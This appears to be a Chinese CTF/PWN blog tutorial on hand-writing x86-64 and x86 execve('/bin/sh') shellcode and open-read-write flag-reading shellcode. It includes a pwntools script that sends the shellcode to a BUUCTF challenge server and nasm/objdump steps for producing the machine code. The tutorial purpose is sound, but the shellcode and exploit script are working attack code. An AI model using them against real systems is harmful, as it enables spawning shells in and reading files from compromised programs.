---
title: 用汇编语言构造简单的shellcode（64位&&32位）以及将汇编语言转换成机器码的方法
tags:
 - 学习总结
 - PWN
 - shellcode
---

# 1、什么是shellcode

​		这里我谈谈自己的理解，shellcode就是人为编写的一段代码，执行这串代码之后，就可以获取电脑的shell。（这个解释为了方便理解，从而忽略了一部分严谨性（如果想看更严谨的定义的话，可以百度一下），但是初学者去理解shellcode的话，这么理解，应该是没什么问题的）。
<!--more-->

# 2、怎么用汇编语言构造简单的shellcode(64位)

前置知识：

① 64位寄存器传参的前三个寄存器分别是rdi,rsi,rdx

②64位系统调用号通过查看linux上的/usr/include/x86_64-linux-gnu/asm/unistd_64.h文件就可以获取

③系统调用号放入rax寄存器，然后syscall就可以执行对应的系统调用函数

​		

​		**首先我们的目的是执行execve("/bin/sh",0,0)。**从而获取shell

​		因此，我们需要干三件事情

​		①因为本来是没有这个execve函数的，但是我们现在要凭空给它造一个，因此这里系统调用execve**（你可以理解为，只要去执行syscall这个指令并且把rax里面装入对应的系统调用号，就可以使用系统调用的任何函数）**

​		②将第一个参数存入"/bin/sh"

​		③将第二个、第三个参.数存入0

**我们要做的是在系统调用execve之前，去把需要的参数都存进去。**

xor rdx,rdx

xor rsi,rsi  #此时去把rsi，rdx两个寄存器都存成0，至于这里为什么不用mov rdx,0和mov rsi,0。

主要是避免出现00字符来截断，不过话说，据我了解，平常如果是直接读入字符串的话，00也不会产生截断的效果，只有用strcpy这类函数的时候，才考虑00截断。不过那为什么我们平常写shellcode还是要尽量选择xor rsi,rsi而不是mov rsi,0呢，是因为xor rsi,rsi所需要的字节数更少。

这个具体的话，可以参考如下两张图片
<img src="/upload/img/image-20220411122805282.png" alt="image-20220411122805282" style="zoom:50%;" />

<img src="/upload/img/image-20220411122813400.png" alt="image-20220411122813400" style="zoom:50%;" />


图片出自[CTF中常见的C语言输入函数截断属性总结 | Clang裁缝店 (xuanxuanblingbling.github.io)](https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/16/input/)

接着是准备要把第一个参数存入rdi，以前我一直以为是rdi的写成/bin/sh对应的ascii码，可是现在才明白，<font color=red>我们只是要把/bin/sh对应的ascii码的*<u>**地址**</u>*给rdi即可</font>。传参的时候，要调用的函数会自己去这个地址里找到对应的/bin/sh。

因此这步要写成
```assembly

xor rdi,rdi

push rdi   #此时的rdi是0，要把这个0压入栈顶，当下面把0x68732f2f6e69622f压入栈顶之后，这个0就起到了截断字符串的作用（用来声明，execve的第一个参数字符串到哪结束）

mov rdi,0x68732f2f6e69622f  #现在rdi的值是0x68732f2f6e69622f

push rdi    #此时参数0x68732f2f6e69622f（即/bin//sh)就存在了栈顶的内存单元中

lea rdi,[rsp]     #等同于mov rdi,rsp  此时是把**栈顶的地址**<u>*（**一定要注意，是栈顶的地址，就是rsp本身的值（rsp本身就是个地址）***</u>，赋值给rdi，也就是说此时rdi的值就是参数的地址
```

这里我还是想详细说一下，因为当初我在这里迷了很久。<font color=red>rsp的值和rsp的内容是两码事</font>，你**可以把他们理解成c语言中的指针p和*p的关系**。<u>rsp的值，就是栈顶内存单元的地址；rsp的内容，就是栈顶的内存单元中的内容。此时rsp的内容才是0x68732f2f6e69622f，而现在只是把栈顶的地址赋给了rdi的值</u>。

现在也才是我们要的效果，<font color=red>rdi里面装的是/bin//sh的地址，而非参数本身</font>。

 这里有两点需要注意：

①这个0x68732f2f6e69622f是/bin//sh对应的ascii码。**并且他是倒着存的**，因为asm在把我们写的**汇编语言转换成机器码的时候，会因为小端序的原因将输入的内容给倒过来**。别的机器码我们不用担心，<u>但是我们输入的字符串，需要手动先给倒过来一次，这样等到汇编语言转换成机器码的时候，再倒过来一次，程序处理字符串的时候，就会拿到真正的参数/bin//sh，而非hs//nib/</u>。

②**0x68732f2f6e69622f中间这里出现了两2f(也就是两个/)，因为这里要填充够八个字节（64位程序中，一个内存单元就只能装八个字节）**

为了达到上述的效果，我们还可以这么写。
```assembly

xor rdi,rdi

mov rdi,0x68732f6e69622f

push rdi

push rsp

pop rdi
```
有好几处内容都变了。

首先是原本xor rdi,rdi下面的push rdi没了，咦？难道我们不需要去在栈中存入一个零，以来声明字符串的结束么？我们依然需要一个00来去截断字符串，但是此刻你还会发现0x68732f6e69622f中间的两个2f现在就变成了一个2f（此时参数是/bin/sh） 难道此时不需要去填充够八字节么。是的不需要了，<font color=red>程序发现了我们这个内存单元的内容不够八字节，它会自己帮我们添加一个00上去以来凑齐八字节，并且这个00同时声明了字符串的结束。</font>

**因此我们不但不需要push一个0，并且还不用去填充八字节，程序帮我们补的00，正好可以去代替原本应该push的0。（值得一提的是如果我们内存单元只有六个字节，那么程序依然会帮我们补全到八个字节，也就是填充两个字节的00）**

最后的变化就是把原本的lea rdi,[rsp]换成了一个push rsp ;pop rdi**（把rsp的值压入栈顶，也就是把rsp的值存入了栈顶内存单元的内容中，再把栈顶的内存单元的内容弹给rdi的值，也就完成了把rsp的值赋给了rdi的值）**<u>**（在这里一定要区分清楚值与内容的关系）**</u>这样做的好处是什么？这样写的字节更少，原本lea rdi,[rsp]是四个字节
![image-20220411122822554](/upload/img/image-20220411122822554.png)

即使换成mov rdi,rsp
![image-20220411122825848](/upload/img/image-20220411122825848.png)

也还是三个字节。但是我们为了达到同样的效果，使用push rsp;pop rdi两个指令，一共也才两个字节。
![image-20220411122829116](/upload/img/image-20220411122829116.png)

因为很多有难度的题目都会限制shellcode的长度，*因此我们所选的shellcode，是越短越好。*

最后，就是将execve对应的系统调用号放入rax中，然后syscall即可

那剩下的汇编就是
```assembly

xor rax,rax

mov rax,0x3b

syscall
```


然后把刚才所写的三部分汇总一下并且精简一下最后仅仅用了0x1e个字节。

```assmebly
xor rax,rax
push 0x3b
pop rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi
push rsp
pop rdi
xor rsi,rsi
xor rdx,rdx
syscall
```
<img src="/upload/img/image-20220411122834434.png" alt="image-20220411122834434" style="zoom:50%;" />

此时只要执行这个shellcode，就可以去拿到shell了。这里拿一道BUUCTF上的mrctf2020_shellcode来演示一下。题目链接[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#mrctf2020_shellcode)

使用IDA分析之后（这道题无法F5，不过可以看汇编来分析），发现我们输入的内容直接就被执行了，因此什么都不用考虑，这道题仅仅就是考察我们64位汇编编写shellcode的能力。利用pwntools中的asm把刚才写好的汇编内容转换成机器码，然后发送过去即可获取shell。

```python
from pwn import *
p=remote('node4.buuoj.cn',27143)
context(arch='amd64',os='linux',log_level='debug')
shellcode=asm('''
xor rax,rax
push 0x3b
pop rax
xor rdi,rdi
mov rdi,0x68732f6e69622f
push rdi
push rsp
pop rdi
xor rsi,rsi
xor rdx,rdx
syscall
''')
p.sendline(shellcode)
p.interactive()
```
# 3、怎么用汇编语言构造简单的shellcode（32位）

前置知识：

①对于32位程序而言，我们最后系统调用采用的并不是syscall，而是int 0x80

②我们传参的前三个寄存器分别是ebx,ecx,edx

③32位的execve系统调用号是11，并且存储系统调用后的寄存器是eax。32位的系统调用号可以查看这个文件/usr/include/x86_64-linux-gnu/asm/unistd_32.h

然后剩下的思路是和64位汇编构造shellcode的思路是一样的。

首先是

```assembly
xor ecx,ecx
xor edx,edx
```

清空两个参数为0的寄存器

然后是

```assembly
xor ebx,ebx 
push ebx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
```

此时把参数/bin/sh压入栈，最开始push ebx是先压入栈中一个0，用来字符串截断。最后将esp指向的地址赋给了ebx，此时ebx的值就是/bin/sh的地址。

<img src="/upload/img/image-20220411122843798.png" alt="image-20220411122843798" style="zoom:33%;" />

此时栈中的情况就是这样，/bin/sh与/bin//sh的效果一样，至于为什么要存入字符串的时候，要反着写，在64位汇编编写shellcode的时候，已经解释过了，这里就不再重复。

最后是

```assembly
xor eax,eax
push 11
pop eax
int 0x80
```

现在是把系统调用号存进去并且进行了系统调用

最后把这三部分结合一下效果如下。

```assembly
xor ecx,ecx
xor edx,edx
xor ebx,ebx 
push ebx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
xor eax,eax
push 11
pop eax
int 0x80
```

# 4、手写open，read，write的shellcode
遇见pwn题开启了沙箱保护的话，如果禁用了execve、system函数，但没有开启NX保护的话，可以采用orw的方式来读出flag。

首先我们要执行的如下的代码：

```python
open(flag_addr,0)
read(3,addr,0x50)#第一个参数是3，因为一个进程有默认的文件描述符0,1,2。当再打开新的文件之后，文件描述符就会以此类推的分配，因此上面open新打开的flag文件的文件描述符就是3
#至于这个addr，把读出来的flag放到哪，一会再说
write(1,addr,0x50)
```

接下来，就开始用汇编来实现上面的内容。

```assembly
open(flag_addr,0)
push 0x67616c66
push rsp
pop rdi
#上面这两步就是在传open的第一个参数，这个参数要是一个地址，这个地址要指向字符串'flag'
#执行完push 0x67616c66的时候，栈顶的内容就是字符串flag，而栈顶指针rsp就指向了这个flag，
#此时执行push rsp将指向flag的地址（也就是rsp）压栈，此时栈顶的内容就是那个指向flag的地址，然后再执行pop rdi
#将栈顶的这个内容弹给rdi，此时open的第一个参数就成为了指向flag的地址
push 0
pop rsi
push 2
pop rax
syscall

read(3,addr,0x50)
push 3
pop rdi
push rsp 
pop rsi
#上面这两步在完成read函数的第二个参数传参，此时压入栈的rsp，我并不知道这个地址是什么
#只知道把这个地址给rsi的话，flag就会被写到这个地址里面，至于这个地址是什么，真的不重要
#重要的是要保证接下来write的第二个参数也是这个地址即可，而我们要做的就是保证接下来的
#每一个push都要对应一个pop，这样栈顶始终就是给当初rsi的那个地址了。
push 0x50
pop rdx
push 0
pop rax
syscall

write(1,addr,0x50)
push 1
pop rdi
push rsp
pop rsi
#这个地方的push rsp pop rsi原理同上
push 0x50
pop rdx
push 1
pop rax
syscall

```

# 5、怎么将自己写好的汇编语言转换成机器码。

上面介绍了用asm将汇编语言转换成机器码（这个方法主要是检查编写的汇编语言没问题之后，再去写exp的时候直接用asm转换了），下面换一种方式来转换。（这个方法主要可以用于平常的调试，以及测试使用）

先用touch shellcode.asm  命令创建一个shellcode.asm文件

然后vim shellcode.asm  去编辑这个文件

将汇编的内容写入这个文件里面。

（同时在文件的开头写上下面三行的内容，其作用可以自行参考[【转】linux汇编.section .text .data 与.global - 比较懒 - 博客园 (cnblogs.com)](https://www.cnblogs.com/lazypigwhy/articles/14112041.html)

section .text
global _start
_start:

最后的写入的内容应该是

<img src="/upload/img/image-20220411122853087.png" alt="image-20220411122853087" style="zoom: 50%;" />




然后用nasm -f elf64 shellcode.asm这个命令去编译刚才写的那个文件

编译成功之后，会自动生成一个shellcode.o  然后去objdump -d shellcode.o查看对应生成的机器码即可

<img src="/upload/img/image-20220411122904373.png" alt="image-20220411122904373" style="zoom:50%;" />

最后左侧就生成了对应的机器码。平常如果想查看自己的shellcode里面有没有出现00字符，就可以用这个方法来查看，或是想知道某一条指令的字节数，也可以通过这个方法查看。
